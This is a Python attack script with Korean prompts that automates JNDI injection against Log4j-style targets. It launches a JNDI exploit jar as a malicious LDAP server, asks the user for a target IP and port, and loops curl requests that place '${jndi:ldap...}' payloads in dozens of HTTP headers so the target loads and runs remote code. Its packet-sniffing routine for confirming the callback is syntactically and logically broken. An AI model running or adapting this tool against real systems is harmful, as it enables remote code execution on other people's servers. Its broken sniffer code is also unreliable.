import os
import socket
import os.path
import threading
import time
from requests import get
from scapy.all import*


num = 0
headers = [
'ALL',
'Forwarded',
'Forwarded-For',
'Forwarded-For-Ip',
'Forwarded-Proto',
'From',
'If-Modified-Since',
'Max-Forwards',
'Origin',
'Originating-Ip',
'Pragma',
'Referer',
'TE',
'True-Client-IP',
'True-Client-Ip',
'Upgrade',
'User-Agent',
'Via',
'Warning',
'X-ATT-DeviceId',
'X-Api-Version',
'X-Att-Deviceid',
'X-CSRFToken',
'X-Client-Ip',
'X-Correlation-ID',
'X-Csrf-Token',
'X-Do-Not-Track',
'X-Foo',
'X-Foo-Bar',
'X-Forward-For',
'X-Forward-Proto',
'X-Forwarded',
'X-Forwarded-By',
'X-Forwarded-For',
'X-Forwarded-For-Original',
'X-Forwarded-Host',
'X-Forwarded-Port',
'X-Forwarded-Proto',
'X-Forwarded-Protocol',
'X-Forwarded-Scheme',
'X-Forwarded-Server',
'X-Forwarded-Ssl',
'X-Forwarder-For',
'X-Frame-Options',
'X-From',
'X-Geoip-Country',
'X-HTTP-Method-Override',
'X-Http-Destinationurl',
'X-Http-Host-Override',
'X-Http-Method',
'X-Http-Method-Override',
'X-Http-Path-Override',
'X-Https',
'X-Htx-Agent',
'X-Hub-Signature',
'X-If-Unmodified-Since',
'X-Imbo-Test-Config',
'X-Insight',
'X-Ip',
'X-Ip-Trail',
'X-Leakix',
'X-Originating-Ip',
'X-ProxyUser-Ip',
'X-Real-Ip',
'X-Remote-Addr',
'X-Remote-Ip',
'X-Request-ID',
'X-Requested-With',
'X-UIDH',
'X-Wap-Profile',
'X-XSRF-TOKEN'
]
servers=['ALL',]

def jar():
    #os.system('clear')
    inip=(os.popen("hostname -I | awk '{print $1}'")).read()
    exip=get("https://api.ipify.org").text
    #debug
    print("inip : "+str(inip))
    print("exip : "+str(exip))
    try: #서버 구동
        global num
        num = num + 1
        #debug
        print('java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C "ping -c 1 '+exip+'" -A '+exip)
        #os.system('java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C "ping -c 1 '+'192.168.52.129'+'" -A '+'192.168.52.129')
        os.system('java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C "ping -c 1 '+exip+'" -A '+exip)
    except Exception as err: #서버 구동 실패
        print('[@] LDAP 서버가 구동에 실패하였습니다.\n')
        print(err)
        exit(1)
    

def main():
    global num
    while True: 
        if num == 1: break
    
    time.sleep(0.5)

    #os.system('clear')
    tip = input('\n[+] 공격을 진행할 서비스의 IP 주소를 작성해주세요.\nEnter : ')
    tpt = input('\n[+] 공격을 진행할 서비스의 PORT를 작성해주세요.\nEnter : ')
    print('\n[+] 당신의 공격 목표가 '+ tip +':'+ tpt +'로 설정되었습니다.')

    #os.system('clear')
    for i in range(1, len(headers)):
        print('\n'+str(i)+"번째 헤더 : "+str(headers[i]))
    print('\n[+] 전체 헤더 리스트입니다.')
    print('\n[+] 헤더 숫자를 적으면 해당 헤더에 대한 공격을 진행하고, 0을 입력할 경우 전체 리스트를 순차적으로 대입합니다.\n')
    hname = int(input('Enter : '))
    print('[+] 선택한 헤더: ' +str(headers[hname]))
    time.sleep(2)
    os.system('clear')

    f = open("./out.txt", 'r')
    fl = f.readlines()
    fnum = 1
    for i in range(len(fl)):
        if 'JDK 1.7' in fl[i]:
            print(str(fnum)+'.JDK 1.7 whose trustURLCodebase is true : ' + fl[i+1])
            fnum = fnum+1
            servers.append(fl[i+1])
            print(str(fnum)+'.JDK 1.7 whose trustURLCodebase is true : ' + fl[i+2])
            fnum = fnum+1
            servers.append(fl[i+2])
        elif 'JDK 1.8' in fl[i]:
            print(str(fnum)+'.JDK 1.8 whose trustURLCodebase is true : ' + fl[i+1])
            fnum=fnum+1
            servers.append(fl[i+1])
            print(str(fnum)+'.JDK 1.8 whose trustURLCodebase is true : ' + fl[i+2])
            fnum=fnum+1
            servers.append(fl[i+2])
        elif 'Tomcat' in fl[i]:
            print(str(fnum)+'.JDK whose trustURLCodebase is false and have Tomcat 8+ or SpringBoot 1.2.x+ in classpath : '+fl[i+1])
            fnum=fnum+1
            servers.append(fl[i+1])
            
    print('\n[+] 전체 서버 주소 리스트입니다.')
    print('\n[+] 숫자를 적으면 해당 서버 주소를 이용해 공격을 진행하고, 0을 입력할 경우 전체 리스트를 순차적으로 대입합니다.\n')
    sname = int(input('Enter : '))
    print('[+] 선택한 주소: ' +str(servers[sname]))
    time.sleep(2)
    os.system('clear')
    
    if (headers[hname] == 'ALL') and (servers[sname] != 'ALL'):
        for x in range(1, len(headers)):
            attcurl = "curl "+tip+":"+tpt+" -H '"+str(headers[x])+": ${jndi:"+str(servers[sname]).replace("\n", "")+"'}"
            print('\n'+attcurl)
            os.system(attcurl)
            time.sleep(0.5)

    elif (headers[hname] != 'ALL') and (servers[sname] == 'ALL'):
        for y in range(1, len(servers)):
            attcurl = "curl "+tip+":"+tpt+" -H '"+str(headers[hname])+": ${jndi:"+str(servers[y]).replace("\n", "")+"'}"
            print('\n'+attcurl)
            os.system(attcurl)
            time.sleep(0.5)

    elif (headers[hname] == 'ALL') and (servers[sname] == 'ALL'):
        for x in range(1, len(headers)):
            for y in range(1, len(servers)):
                attcurl = "curl "+tip+":"+tpt+" -H '"+str(headers[x])+": ${jndi:"+str(servers[y]).replace("\n", "")+"'}"
                print('\n'+attcurl)
                os.system(attcurl)
                time.sleep(0.5)
    else:
        attcurl = "curl "+tip+":"+tpt+" -H '"+str(headers[hname])+": ${jndi:"+str(servers[sname]).replace("\n", "")+"'}"
        print(attcurl)
        os.system(attcurl)

def sn(pkt) :
    if check == '2':
        print('ok')
        check = 0
    if pkt.haslayer(ICMP):
        if socket.gethostbyname(socket.gethostname())==pkt[IP].src:
            #print(str("[")+str(time)+str("]")+"  "+"ICMP-OUT:{}".format(len(pkt[ICMP]))+" Bytes"+"    "+"IP-Version:"+str(pkt[IP].version) +"    "*1+" SRC-MAC:"+str(pkt.src)+"    "+"DST-MAC:"+str(pkt.dst)+"    "+"SRC-IP: "+str(pkt[IP].src)+ "    "+"DST-IP:  "+str(pkt[IP].dst))
            if str(pkt[IP].src) == 'tip' & str(pkt[IP].dst) == str(exip): check = check + 1
        #if socket.gethostbyname(socket.gethostname())==pkt[IP].dst:
            #print(str("[")+str(time)+str("]")+"  "+"ICMP-IN:{}".format(len(pkt[ICMP]))+" Bytes"+"    "+"IP-Version:"+str(pkt[IP].version)+"    "*1+"    SRC-MAC:"+str(pkt.src)+"    "+"DST-MAC:"+str(pkt.dst)+"    "+"SRC-IP: "+str(pkt[IP].src)+ "    "+"DST-IP:  "+str(pkt[IP].dst)) 
            if str(pkt[IP].src == str(exip) & str(pkt[IP].dst) == 'tip': check = check + 1

def sp():
    sniff(prn=sn)

if __name__ == '__main__':
    t1=threading.Thread(target=jar)
    t2=threading.Thread(target=sp)
    t1.daemon=True
    t2.daemon=True
    t1.IsBackground=True
    t2.IsBackground=True
    t1.start()
    t2.start()
    main()
